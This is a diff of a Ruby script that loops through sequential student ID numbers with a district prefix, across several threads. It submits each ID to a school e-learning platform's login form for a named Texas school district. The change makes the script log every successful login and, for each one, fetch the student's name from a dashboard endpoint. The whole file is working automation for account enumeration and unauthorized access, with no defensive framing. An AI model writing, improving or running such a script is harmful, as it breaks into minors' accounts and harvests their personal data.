@@ -21,7 +21,7 @@ LOG_FILE  = "scriptlog.txt"
 
 # Prefix number for usernames...Every school has one, and usually uses them to login to the e-libraries
 # The default is for a school in RRISD
-LOGIN_SEQ = ["46""]
+LOGIN_SEQ = ["46"]
 
 # School district
 LOGIN_DIS = "Round Rock ISD"
@@ -30,7 +30,8 @@ LOGIN_DIS = "Round Rock ISD"
 
 def do_req num, seq, dis
   a = Mechanize.new
-  a.get('http://platform.learning.com/LoginNew.htm') do |page|
+  r = {}
+  a.get 'http://platform.learning.com/LoginNew.htm' do |page|
     # Submit the login form
     page.form_with do |f|
       f.learningUserName = seq + num.to_s
@@ -38,13 +39,15 @@ def do_req num, seq, dis
       f.learningDistrictName = dis
     end.click_button
 
-    form = page.forms.first
-    return form.submit
+    after_page = page.forms.first.submit
+    r[:success] = !(after_page.content.include? 'Error')
   end
-end
 
-def is_valid? num, seq, dis
-  !do_req(num, seq, dis).content =~ /Error/
+  return r unless r[:success]
+  xml_address = 'http://platform.learning.com/Services/Ajax/Student/Student.asmx/GetAllDashboardInfo'
+  xml = a.post xml_address, xml_address
+  r[:name] = xml.at('Name').children[0].content
+  r
 end
 
 # Arg parser
@@ -58,6 +61,7 @@ end
 threads = []
 
 class InsNum
+  attr_reader :value
   def initialize number
     @value = number - 1
   end
@@ -66,12 +70,7 @@ class InsNum
     @value += 1
     @value
   end
-
-  def value
-    @value
-  end
 end
-
 
 open LOG_FILE, "a" do |log_file|
   current_id = InsNum.new ARGV[0].to_i
@@ -82,9 +81,10 @@ open LOG_FILE, "a" do |log_file|
         x = current_id.get_value
         puts "?".blue + " #{x}"
         LOGIN_SEQ.each do |seq|
-          if is_valid? x, seq, LOGIN_DIS
-            log_file.puts "#{seq}#{x}"
-            puts "!".red + " #{x} #{seq}"
+          r = do_req x, seq, LOGIN_DIS
+          if r[:success]
+            log_file.puts "#{seq} #{x} #{r[:name]}"
+            puts "!".red + " #{x} #{seq} #{r[:name]}"
           end
         end
       end
